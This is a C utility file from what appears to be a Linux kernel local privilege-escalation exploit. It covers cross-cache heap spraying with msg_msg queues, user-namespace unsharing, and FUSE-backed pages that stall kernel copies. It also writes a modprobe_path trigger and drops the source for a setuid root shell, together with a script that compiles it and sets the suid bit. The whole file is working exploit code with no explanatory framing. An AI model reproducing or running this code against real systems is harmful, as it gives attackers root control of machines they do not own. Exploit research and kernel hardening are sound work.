#include "utils.h"

// pipe used to send data from the exploit process to the do_read fuse handler
int pipe_main2fuse[2];
// pipe used to send data from the do_read fuse handler to the exploit process
int pipe_fuse2main[2];

void assign_to_core(int core_id) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(core_id, &set);
    if(sched_setaffinity(0, sizeof(set), &set) < 0) {
        ERROR("Failed to set CPU affinity");
        perror("sched_setaffinity");
    }
    return;
}

int spray_msg(int n_spray, int msg_size, int *qids, unsigned int qids_offset) {
    int err;
    int qid;
    msgbuf msg;
    msg.mtype = 1;
    memset(msg.mtext, 'A', msg_size);
    for (unsigned int i = 0; i < n_spray; i++) {
        qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        if (qids)
            qids[i + qids_offset] = qid;
        err = msgsnd(qid, &msg, msg_size, 0);
        if (err) {
            ERROR("Failed to call msgsnd");
            perror("msgsnd");
            return 1;
        }
    }
    return 0;
}

int spray_msg_threaded(int n_spray, int msg_size, pthread_t *threads, unsigned int threads_offset, void *func(void *)) {
    int err;
    for (int i = 0; i < n_spray; i++) {
        LOG("About to create thread %i", i + threads_offset);
        struct thread_func_args *args = (struct thread_func_args *)malloc(sizeof(struct thread_func_args));
        args->index = i + threads_offset;
        args->msg_len = msg_size;
        err = pthread_create(&threads[i + threads_offset], NULL, func, args);
        if (err !=0) {
            ERROR("Failed to create thread");
            perror("pthread_create");
            return 1;
        } else {
            LOG("Thread %i correctly created", i + threads_offset);
        }
    }
    return 0;
}

void unshare_and_map_user(uid_t uid, gid_t gid) {
    INFO("Unsharing mount and user namespaces");
    int temp;
    char edit[0x100];
    unshare(CLONE_NEWNS|CLONE_NEWUSER);

    // map the effective user and group IDs of the process in the parent namespace to the root UID and GID of the new
    // namespace. this makes it possible to gain full capabilities in the newly created namespace (see description of
    // the "-r" option in https://man7.org/linux/man-pages/man1/unshare.1.html)
    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);

    // to be able to write to /proc/self/gid_map without CAP_SETGID in the parent user namespace, we first need to write
    // "deny" into /proc/self/setgroups (see point 5 in the section "Defining user and group ID mappings: writing to
    // uid_map and gid_map" in https://man7.org/linux/man-pages/man7/user_namespaces.7.html)
    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);

    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);

    // now we have full capabilities inside the new namespace and can proceed
    return;
}

void drop_modprobe_files() {
    // drop modprobe_trigger file
    char trigger_content[] = "\xff\xff\xff\xff";
    int fd2 = open(MODPROBE_TRIGGER, O_RDWR | O_CREAT);
    write(fd2, trigger_content, sizeof(trigger_content));
    close(fd2);
    chmod(MODPROBE_TRIGGER, 0777);

    // drop suid source file
    char suid_contents[] = "#include <stdio.h>\n"
                           "#include <stdlib.h>\n"
                           "#include <unistd.h>\n"
                           "int main() {\n"
                           "  setuid(0); seteuid(0); setgid(0); setegid(0);\n"
                           "  char *argv[] = { \"bash\", \"-p\", NULL };\n"
                           "  execve(\"/bin/bash\", argv, NULL);\n"
                           "  exit(0);\n"
                           "}\n";
    fd2 = open(SUID_SRC, O_RDWR | O_CREAT);
    write(fd2, suid_contents, sizeof(suid_contents));
    close(fd2);

    // drop compile_suid file
    char compile_suid_content[] = "#!/bin/sh\n"
                                  "gcc " SUID_SRC " -o " SUID "\n"
                                  "chmod u+s " SUID"\n";
    fd2 = open(COMPILE_SUID, O_RDWR | O_CREAT);
    write(fd2, compile_suid_content, sizeof(compile_suid_content));
    close(fd2);
    chmod(COMPILE_SUID, 0777);
}

int exec_modprobe_trigger() {
    INFO("Attempting to trigger modprobe");
    char *argv[] = {MODPROBE_TRIGGER, NULL};
    struct stat statbuf;
    execve(MODPROBE_TRIGGER, argv, NULL);
    stat(SUID, &statbuf);
    return stat(SUID, &statbuf) == 0;
}

void start_fuse() {
    // create pipes
    pipe(pipe_main2fuse);
    pipe(pipe_fuse2main);

    // create fuse dir
    if(mkdir(FUSE_ROOT, S_IRWXU) != 0)
        ERROR("Error at mkdir()");

    // fork and execute fuse_main in the child process
    if (!fork()) {
        close(pipe_fuse2main[0]);
        close(pipe_main2fuse[1]);
        char *argv[] = {"exploit", "-f", FUSE_ROOT, NULL};
        fuse_main(3, argv, &operations, NULL);
        exit(0);
    }
    close(pipe_fuse2main[1]);
    close(pipe_main2fuse[0]);
    // wait 1 second to allow fuse fs to be mounted in child process before proceeding
    sleep(1);
}

void fuse_cleanup() {
    // unmap all mmaped pages
    for (int i = 0; i < N_SPRAY_MSG; i++) {
        void *normal_page = (void *)0x1000000 + 0x100000*i;
        void *fuse_page = normal_page + 0x1000;
        munmap(normal_page, 0x1000);
        munmap(fuse_page, 0x1000);
    }

    // unmount fuse filesystem and remove created directory
    system("fusermount -u " FUSE_ROOT);
    rmdir(FUSE_ROOT);
}

void *send_fuse_msg(void *args) {
    int index, fusefd, qid, len = strlen(FUSE_ROOT) + 6;
    char fuse_filename[len];
    size_t msg_len;
    void *normal_page, *fuse_page;

    // we want all threads to run on the same CPU, so they have the same active slab
    assign_to_core(0);

    // map a normal page immediately followed by a fuse-backed page
    index = ((struct thread_func_args *)args)->index;
    normal_page = (void *)0x1000000 + 0x100000*index;
    fuse_page = normal_page + 0x1000;
    LOG("mmaping: normal_page = %p, fuse_page = %p", normal_page, fuse_page);
    if (mmap(normal_page, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1,
             0) != normal_page) {
        ERROR("Failed to mmap normal page %d", index);
        perror("mmap");
        exit(1);
    }

    snprintf(fuse_filename, len,"%s/f%d", FUSE_ROOT, (int)index);
    fusefd = open(fuse_filename, O_RDWR);
    if (fusefd < 0) {
        ERROR("Opening %s fd failed. ", fuse_filename);
        perror("open");
        exit(1);
    }
    if ((mmap(fuse_page, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fusefd, 0)) !=
    fuse_page) {
        ERROR("Failed to mmap fuse-backed page %d", index);
        perror("mmap");
        exit(1);
    }
    close(fusefd);

    // construct msgbuf that has the data (i.e. msgbuf->mtext, which is at offset 0x8) starting at the fuse-backed page.
    // when the kernel accesses msgbuf->mtext the fuse handler do_read will be triggered, and the data will be provided
    // from there
    msgbuf *msg = (msgbuf *)(fuse_page - 0x8);
    msg->mtype = 1;
    qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);

    // get msg_len passed as argument, and send the message
    msg_len = ((struct thread_func_args *)args)->msg_len;
    msgsnd(qid, msg, msg_len, 0);
}

void wait_for_fuse_signals() {
    char signal[1];
    INFO("Waiting for signal from do_read to proceed (target objects to be allocated)");
    for (int i = 0; i < N_SPRAY_MSG; i++) {
        read(pipe_fuse2main[0], signal, 1);
        LOG("Received signal number %d", i);
    }
    INFO("Received all signals from do_read. All target objects have been allocated. We can proceed!");
}

void send_signals_to_fuse() {
    INFO("Finished, signaling do_read to continue");
    for (int i = 0; i < N_SPRAY_MSG; i++) {
        write(pipe_main2fuse[1], "g", 1);
    }
}
